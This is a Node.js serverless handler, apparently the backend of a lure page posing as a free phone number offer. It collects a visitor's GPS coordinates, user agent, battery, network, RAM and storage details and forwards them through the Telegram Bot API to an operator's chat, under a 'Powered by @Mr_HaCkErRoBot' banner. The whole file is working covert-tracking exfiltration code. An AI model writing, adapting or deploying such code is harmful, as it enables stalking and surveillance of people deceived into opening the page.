const fetch = require('node-fetch');
const FormData = require('form-data');
const formidable = require('formidable');
const Redis = require('ioredis');


const redis = new Redis(process.env.UPSTASH_REDIS_REST_URL, {
  password: process.env.UPSTASH_REDIS_REST_TOKEN,
  tls: {}
});

module.exports = async (req, res) => {
  const botToken = process.env.TOKEN;
  const allowedOrigin = 'https://free-number1.vercel.app'; 

  if (req.headers.origin && req.headers.origin !== allowedOrigin) {
    return res.status(403).json({ ok: false, error: 'Invalid origin' });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  const form = new formidable.IncomingForm();

  form.parse(req, async (err, fields) => {
    if (err) {
      return res.status(500).json({ ok: false, error: 'Failed to parse form data.' });
    }

    const allowedFields = [
      'chat_id', 'latitude', 'longitude', 'user_agent', 'timezone',
      'battery_level', 'battery_charging', 'network_type', 'network_speed',
      'ram', 'storage', 'country_code'
    ];

    for (const field in fields) {
      if (!allowedFields.includes(field)) {
        return res.status(400).json({ ok: false, error: 'Invalid input field: ' + field });
      }
    }

    const {
      chat_id: chatId,
      latitude,
      longitude,
      user_agent: userAgent,
      timezone,
      battery_level: batteryLevel,
      battery_charging: batteryCharging,
      network_type: networkType,
      network_speed: networkSpeed,
      ram,
      storage,
      country_code: countryCode
    } = fields;

    if (!chatId || !latitude || !longitude) {
      return res.status(400).json({ ok: false, error: 'Missing required parameters.' });
    }

    
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const redisKey = `rate:${ip}`;

    try {
      const count = await redis.incr(redisKey);

      if (count === 1) {
        
        await redis.expire(redisKey, 15 * 60);
      }

      if (count > 10) {
        return res.status(429).json({ ok: false, error: '⛔ شما به محدودیت ۱۰ بار در ۱۵ دقیقه رسیده‌اید. لطفاً بعداً دوباره تلاش کنید.' });
      }

      
      const now = new Date();
      const dateTime = now.toLocaleString();

      const messageText = `*╭┈┈┈┈┈┈┈┈┈┈┈┈┈╮\n⚡Powered by :- @Mr_HaCkErRoBot\n╰┈┈┈┈┈┈┈┈┈┈┈┈┈╯*\n\n` +
        `*📌 New Data Received:*\n\n` +
        `*📍 Latitude:* ${latitude}\n` +
        `*📍 Longitude:* ${longitude}\n` +
        `*📱 User Agent:* ${userAgent || 'Unknown'}\n` +
        `*📅 Date:* ${dateTime}\n` +
        `*🌍 Timezone:* ${timezone || 'Unknown'}\n` +
        `*🔋 Battery:* ${batteryLevel || 'Unknown'}% (${batteryCharging === 'true' ? 'Charging' : 'Not Charging'})\n` +
        `*📶 Network:* ${networkType || 'Unknown'} (${networkSpeed || 'Unknown'} Mbps)\n` +
        `*📞 Selected Number:* User Denied\n` +
        `*🌐 Country Code:* ${countryCode || 'Unknown'}\n` +
        `*💾 RAM:* ${ram || 'Unknown'} GB\n` +
        `*💽 Storage:* ${storage || 'Unknown'}\n` +
        `*🔒 Permission:* Denied`;

      await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ chat_id: chatId, latitude, longitude })
      });

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ chat_id: chatId, text: messageText, parse_mode: 'Markdown' })
      });

      return res.status(200).json({ ok: true });
    } catch (error) {
      return res.status(500).json({ ok: false, error: 'Server error: ' + error.message });
    }
  });
};
